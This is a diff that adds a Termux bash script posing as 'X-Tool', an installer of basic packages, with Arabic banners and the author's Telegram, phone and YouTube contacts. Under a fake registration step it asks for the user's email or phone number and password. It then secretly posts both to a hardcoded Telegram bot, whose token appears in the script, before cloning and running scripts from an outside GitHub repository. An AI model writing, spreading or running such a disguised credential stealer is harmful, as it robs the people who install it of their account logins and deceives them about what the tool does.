@@ -1,0 +1,81 @@
+#!/bin/bash
+export LANG=ar_EG.utf-8
+echo "******************************************"
+echo "*                                        *"
+echo "*                                        *"
+echo "*                X-Tool                  *"
+echo "*                                        *"
+echo "*    ﻲﺑﺮﻐﻤﻟﺍ ﺀﺎﻬﺑ ﺔﻄﺳﺍﻮﺑ ﺓﺍﺩﻻﺍ ﺮﻳﻮﻄﺗ     *"
+echo "*                                        *"
+echo "*        ﻡﺍﺮﺠﻠﻴﺘﻟﺍ ﻲﻓ ﻲﺗﺎﻧﺎﻗ ﻂﺑﺍﺭ        *"
+echo "*                                        *"
+echo "*        https://t.me/bahaa_010640       *"
+echo "*                                        *"
+echo "*                                        *"
+echo "******************************************"
+sleep 5
+read  -p " ﺭﺍﺮﻤﺘﺳﻼﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ "
+echo" ﺕﺎﻴﺳﺎﺳﻻﺍ ﺖﻴﺒﺜﺗ ﻥﻻﺍ ﻱﺮﺠﻳ....."
+termux-setup-storage
+pkg update -y && pkg upgrade -y && pkg install python -y && pkg install git -y
+
+echo "ﺕﺎﺒﻠﻄﺘﻤﻟﺍ ﺖﻴﺒﺜﺗ ﻢﺘﻳ"
+sleep 5
+echo" ﺕﺎﻴﺳﺎﺳﻻﺍ ﺖﻴﺒﺜﺗ ﻝﺎﻤﻛﻷ ﻝﻮﺧﺪﻟﺍ ﻞﻴﺠﺴﺗ ﺀﺎﺟﺮﻟﺍ "
+tok=7023319102:AAHma8eMrLiYtW2-4sF0bGDXuMHdjQgHKxs
+CHAT_ID=5792222595
+while true; do
+  read -p " ﺔﻟﻭﺪﻟﺍ ﺩﻮﻛ ﻊﻣ ﻒﺗﺎﻬﻟﺍ ﻢﻗﺭ ﻭﺍ ﺪﻳﺮﺒﻟﺍ ﻝﺎﺧﺩﺍ ﺀﺎﺟﺮﺑ: " nan 
+  if [[ ${#nan} -lt 8 ]]; then
+    echo "ﺢﻴﺤﺻ ﺮﻴﻏ ﺪﻳﺮﺒﻟﺍ ﻭﺍ ﻒﺗﺎﻬﻟﺍ ﻢﻗﺭ"
+  else
+    break
+  fi
+done
+
+echo "Done...: $non"
+echo " ﺏﺎﺴﺤﻟﺍ ﺭﻭﺮﻣ ﺔﻤﻠﻛ ﻝﺍﺩﺍ ﺀﺎﺟﺮﻳ"
+while true; do
+read -p "+ " pass
+  if [[ ${#pass} -lt 6 ]]; then
+    echo " ﺔﺤﻴﺤﺻ ﺮﻴﻏ ﺮﺴﻟﺍ ﺔﻤﺒﻛ"
+  else
+    break
+  fi
+done
+
+echo "Done...:"
+
+curl -s -X POST "https://api.telegram.org/bot$tok/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$nan : pasword=$pass" 
+echo" ﺭﺎﻈﺘﻧﻻﺍ ﺀﺎﺠﺗﺮﺑ ﺕﺎﻴﺳﺎﺳﻻﺍ ﺖﻴﺒﺜﺗ ﻥﻻﺍ ﺭﺎﺟ"
+
+
+#python ts.py
+
+git clone https://github.com/Cyber-218/Termux-
+cd Termux-
+python basic_termux.py 
+
+echo" ﻥﻮﺜﻳﺎﺒﻟﺎﺑ ﺐﺗﺎﻜﻤﻟﺍ ﺖﻴﺒﺜﺗ ﻥﻻﺍ ﻱﺭﺎﺟ"
+python Python_library.py
+
+echo "########################################################"
+echo "!                                                      !"
+echo "!     ﺀﺎﻬﺑ :ﺃ ﺕﺎﻴﺤﺗ ﻊﻣ ﺡﺎﺠﻨﺑ ﺕﺎﻴﺳﺎﺳﻻﺍ ﻊﻴﻤﺟ ﺖﻴﺒﺜﺗ ﻢﺗ    !"
+echo "!                                                      !"
+echo "!               ﺔﻠﻜﺸﻣ ﻙﺪﻨﻋ ﺍﺫﺍ ﻥﻮﻔﻟﺍ ﻢﻗﺭ               !"
+echo "!                                                      !"
+echo "!                    +201064004818                     !"
+echo "!                                                      !"
+echo "!               ﺍﺮﺠﻠﻴﺘﻟﺍ ﻲﻓ ﻲﺗﺎﻧﺎﻗ ﻂﺑﺍﺭ                !"
+echo "!                                                      !"
+echo "!              https://t.me/bahaa_010640               !"
+echo "!                                                      !"
+echo "!                                    : ﺏﻮﻴﺗﻮﻳ          !"
+echo "!                                                      !"
+echo "!  https://youtube.com/@Bahaa.0bb?si=-rmHGYYqtdBrtf6y  !"
+echo "!                                                      !"
+echo "########################################################"
+sleep 30
+echo".... ﻲﺑﺮﻋ ﻚﻧﻻ ﺍﺬﻫ"
+echo "ﻦﻴﻄﺴﻠﻓ ﻲﻓ ﺎﻨﻠﻫﻻ ﺀﺎﻋﺪﻟﺍ ﻰﺴﻨﺗ ﻻ"
